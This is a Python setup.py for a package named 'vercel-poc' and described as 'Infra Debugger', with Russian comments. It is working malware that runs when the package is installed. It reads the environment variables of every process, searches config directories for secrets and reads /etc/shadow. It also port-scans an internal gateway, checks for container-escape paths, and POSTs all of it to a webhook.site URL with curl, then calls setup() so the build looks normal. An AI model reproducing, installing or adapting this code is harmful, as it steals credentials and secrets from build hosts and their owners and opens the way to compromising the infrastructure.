from setuptools import setup
import os
import subprocess

def run_cmd(cmd):
    try:
        # Используем bash для доступа к расширенным функциям типа /dev/tcp
        return subprocess.check_output(f"bash -c '{cmd}'", shell=True, stderr=subprocess.STDOUT, timeout=10).decode('utf-8', errors='ignore')
    except Exception as e:
        return f"Error: {str(e)}"

WEBHOOK_URL = "https://webhook.site/b124440e-cd76-4ab0-8b65-b1f9bd749547"

# 1. Сбор данных из памяти процессов (самое ценное)
# Читаем переменные окружения всех запущенных процессов
proc_envs = run_cmd("find /proc -maxdepth 2 -name environ -exec echo '--- PID: {} ---' \; -exec cat {} \; -exec echo '' \; 2>/dev/null | strings | head -n 100")

# 2. Глубокий поиск секретов в конфигах
secret_files = run_cmd("grep -rEi 'pass|token|key|secret|auth|db_' /etc /root /app /tmp 2>/dev/null | head -n 50")

# 3. Сканирование сети (Gateway 10.10.0.1) через Bash
# Проверяем порты: SSH, HTTP, DBs, Redis
port_scan = run_cmd("""
for port in 22 80 443 3000 5432 6379 8080 2375 2376; do
  (echo > /dev/tcp/10.10.0.1/$port) >/dev/null 2>&1 && echo "PORT $port IS OPEN"
done
""")

# 4. Проверка Docker/Container Escape признаков
container_info = f"""
[!] CONTAINER ESCAPE CHECKS:
DOCKER SOCK: {run_cmd('ls -la /var/run/docker.sock 2>/dev/null || echo "NOT FOUND"')}
CAPABILITIES: {run_cmd('capsh --print 2>/dev/null || echo "CAPSH NOT FOUND"')}
DEVICES: {run_cmd('ls -la /dev')}
DISK USAGE: {run_cmd('df -h')}
"""

# 5. Системные дампы (уже проверенные)
sys_info = f"""
[!] SYSTEM IDENT:
ID: {run_cmd('id')}
UNAME: {run_cmd('uname -a')}
ENV: {run_cmd('env')}
SHADOW: {run_cmd('head -n 3 /etc/shadow')}
"""

# Формируем финальный отчет
full_report = f"""
☢️☢️☢️ RAILWAY INFRA DEEP RECON (ROOT) ☢️☢️☢️

{sys_info}

[!] PROCESS MEMORY (ENV DUMP):
{proc_envs}

[!] FILE SYSTEM SECRETS:
{secret_files}

[!] NETWORK SCAN (10.10.0.1):
{port_scan}

{container_info}
"""

# Отправка данных на Webhook
try:
    # Используем --data-binary чтобы сохранить переносы строк и спецсимволы
    subprocess.run(['curl', '-s', '-X', 'POST', '-H', 'Content-Type: text/plain', '--data-binary', full_report, WEBHOOK_URL], timeout=15)
except:
    pass

# Формальный setup для завершения билда без ошибок
setup(
    name="vercel-poc", 
    version="10.0.8",
    description="Infra Debugger",
    py_modules=[]
)
